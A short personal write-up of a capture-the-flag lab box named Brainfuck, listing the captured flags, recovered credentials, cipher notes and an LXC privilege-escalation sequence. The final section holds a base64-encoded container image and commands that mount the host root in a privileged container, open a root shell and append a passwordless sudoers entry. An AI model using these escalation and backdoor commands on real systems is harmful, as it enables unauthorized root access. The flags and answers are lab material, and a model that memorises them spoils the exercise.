# TryHackMe Brainfuck

> Saikat Karmakar | Oct 14 : 2022
 
> Ip
```
10.129.46.66
```

---

1. user flag
```
1ce8555dc57fe13732f76de99036f4d4
```
2. root flag
```
55b95ca27dc1977ce44aace8ef7ca109
```


---

***Notes***
---

- email : orestis@brainfuck.htb

- smpt: 
```bash
orestis:kHGuERB29DNiNE
```
- secret page:
```bash
username: orestis
password: kIEnnfEKJ#9UmdO
```

### Let's break it 

plain txt   = Orestis - Hacking for fun and profit
cipher txt1 = Pieagnm - Jkoijeg nbw zwx mle grwsnn
cipher txt2 = Wejmvse - Fbtkqal zqb rso rnl cwihsf
cipher txt3 = Qbqquzs - Pnhekxs dpi fca fhf zdmgzt

script written

- ssh : id_rsa
```
orestis:3poulakia!
```

## lxc priv
```bash
echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2

lxc image import bob.tar.bz2 --alias bobImage
lxc init bobImage bobVM -c security.privileged=true
lxc config device add bobVM realRoot disk source=/ path=r
lxc start bobVM
lxc list
lxc exec bobVM -- /bin/bash

# other way

echo "orestis ALL=(ALL) NOPASSWD: ALL" >> /r/etc/sudoers


```

